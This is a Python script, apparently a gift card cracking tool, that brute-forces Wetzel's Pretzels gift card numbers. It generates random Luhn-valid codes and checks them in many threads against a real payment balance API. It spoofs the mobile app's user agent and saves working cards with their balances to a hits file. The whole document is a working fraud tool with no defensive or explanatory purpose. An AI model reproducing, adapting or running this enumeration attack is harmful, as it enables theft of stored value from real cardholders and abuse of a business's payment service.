import requests , luhn , random ,json , concurrent.futures , logging, ctypes , threading,os
from time import sleep

clear = lambda: os.system('cls')
fails = 0
success = 0
error = 0
total = 0

def create_code():
    base = '98889'
    for i in range(0,8):
        base = base + str(random.randint(0,9))
    code = luhn.append(base)
    return code

def check_gc():
    global fails , success, error,total
    code = create_code()
    headerss = {'Host':'pay.relevantmobile.com' , 'User-Agent':'Wetzels/1.1.1 (iPhone; iOS 13.5; Scale/3.00)' , 'Accept-Language':'en-US;q=1' , 'Accept-Encoding':'gzip, deflate, br','Connection':'keep-alive'}
    #proxy = {'http':'mimicproxy.xyz:19999','https':'mimicproxy.xyz:19999'}
    try:
        f = open('Wetzle_Hits.txt','a')
        r = requests.get('https://pay.relevantmobile.com/giftcard-rest/api/v1/card/' +code+'?' , headers=headerss, timeout=10)
        if 'number that you have entered is invalid' in r.content.decode():
            fails += 1
        elif 'status" : true' in r.content.decode():
            resp = r.json()
            if int(resp['balance']) == 0:
                success += 1
                total = total+ int(resp['balance'])
                f.write('HIT | {}'.format(code) + ' balance: {}'.format(str(resp['balance']))+'\n')
            else:
                f.write('HIT | {}'.format(code) + ' balance: {}'.format(str(resp['balance']))+'\n')
                success += 1
                total = total+ int(resp['balance'])
        f.close()
    except:
        error += 1
    
def titlemodifer():
    global fails,success, error , total
    while 1:
        ctypes.windll.kernel32.SetConsoleTitleW("Wetzle Dominator | HITS:{} | ".format(str(success)) + ' FAIL:{} | '.format(str(fails)) +' TOTAL:{} | '.format(str(total))+' ERRORS:{}'.format(str(error)))
        sleep(0.1)

def SplashUpdater():
    global fails, success,error
    while 1:
        clear()
        print('{:*^50}'.format('__________________________Wetzel Destroyer________________________\n'))
        print('                   '+'Hits: ' + str(success) +' | ' + 'Fails: '+str(fails) + ' | ' + 'Errors: '+str(error))
        print('__________________________________________________________________')
        sleep(0.1)

if __name__ == "__main__":
    progress = 0
    checkcount = input('Number of codes to check: ')
    maxthreads = input('Maximum concurrent threads: ')
    x = threading.Thread(target=titlemodifer)
    z = threading.Thread(target=SplashUpdater)
    x.start()
    z.start()
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(maxthreads)) as executor:
        for index in range(int(checkcount)):
            executor.submit(check_gc)
    print('\nFinished.\nHits:{}'.format(str(success)) + ' Fails:{}'.format(str(fails)) + ' Errors:{}'.format(str(error)))